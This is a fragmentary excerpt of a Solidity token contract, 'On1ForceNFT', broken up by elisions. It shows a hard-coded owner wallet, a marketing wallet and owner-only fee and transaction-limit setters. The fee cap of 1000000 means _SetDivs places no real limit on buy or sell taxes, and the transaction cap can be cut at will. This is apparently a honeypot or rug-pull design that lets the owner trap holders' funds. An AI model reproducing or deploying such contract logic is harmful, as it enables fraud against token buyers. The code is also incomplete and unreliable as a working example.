...
*/
/* 
    Telegram: https://t.me/On1ForceNFT
...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x969974bf64b56276Ae9176Ba183B4B7f7b3ceF34;
...
contract On1ForceNFT is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private Wallet_Marketing = payable(0x59D4f0AEc3aEA43f551498E7A734fbC44057a903);
    address payable public Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 
    address payable public Wallet_dead = payable(0x0000000000000000000000000000000000000000); 
    ...
    */
    ...
    string private _name = "On1ForceNFT"; 
    string private _symbol = "On1";  
    ...
    uint256 private maxPossibleFee = 1000000; 


    // Setting the initial fees
    uint256 private _TotalFee = 1000000;
    uint256 public _alltaxFee = 10;
    uint256 private _sellFee = 10;


    // 'Previous fees' are used to keep track of fee settings when removing and restoring fees
    uint256 private _previousTotalFee = _TotalFee; 
    uint256 private _previousBuyFee = _alltaxFee; 
    ...
    */
    ...
    function _SetDivs(uint256 Div1, uint256 Div2) external onlyOwner() {

        require((Div1 + Div2) <= maxPossibleFee, "");
        _sellFee = Div2;
        _alltaxFee = Div1;
    ...
    */
    ...
    function set_Max_Transaction_Percent(uint256 maxTxPercent_x100) external onlyOwner() {
        _maxTxAmount = _tTotal*maxTxPercent_x100/30000;
    }    
    ...
    function removeAllFee() private {
        if(_TotalFee == 0 && _alltaxFee == 0 && _sellFee == 0) return;


        _previousBuyFee = _alltaxFee; 
    ...
    function _transfer(
        ...
        */
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
            takeFee = false;
        } else if (from == uniswapV2Pair){_TotalFee = _alltaxFee;} else if (to == uniswapV2Pair){_TotalFee = _sellFee;}
